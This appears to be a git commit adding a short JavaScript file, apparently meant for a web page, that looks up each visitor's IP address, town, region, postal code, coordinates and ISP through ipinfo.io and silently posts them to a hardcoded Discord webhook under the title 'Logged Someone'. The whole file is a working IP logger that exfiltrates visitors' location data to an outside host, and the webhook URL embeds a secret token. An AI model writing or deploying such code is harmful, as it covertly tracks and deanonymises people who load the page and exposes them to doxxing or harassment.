8123b25e13d01a0d0df4013240ffd25d78abf56a
9ggy <84878036+9ggy@users.noreply.github.com>
2022-02-10 12:51:11 -0500

    Create script.js

---
+++ codebase/script.js
@@ -0,0 +1,35 @@
+$.getJSON("https://ipinfo.io/json", function(data) {         
+  var params = {
+    embeds: [
+      {
+        "title": "Logged Someone",
+        "color": 15258703,
+        "thumbnail": {
+        },
+        "fields": [
+          {
+            "name": "IP Address",
+            "value": `> ${data.ip}`
+          },
+          {
+            "name": "GeoLocation Info",
+            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
+          },
+          {
+            "name": "Network Info",
+            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
+          }
+        ]
+      }
+    ]
+  }
+  fetch('https://discord.com/api/webhooks/939310256574566490/WwUGFcivSfG1ZQgRD19mAE8Jembly-5Ijq7bkzHcmaTrLVm3MmFD6U011RuAbjbqvIsF', {
+    method: "POST",
+    headers: {
+        'Content-type': 'application/json'
+    },
+    body: JSON.stringify(params)
+  }).then(res => {
+    console.log(res);
+  }) 
+})
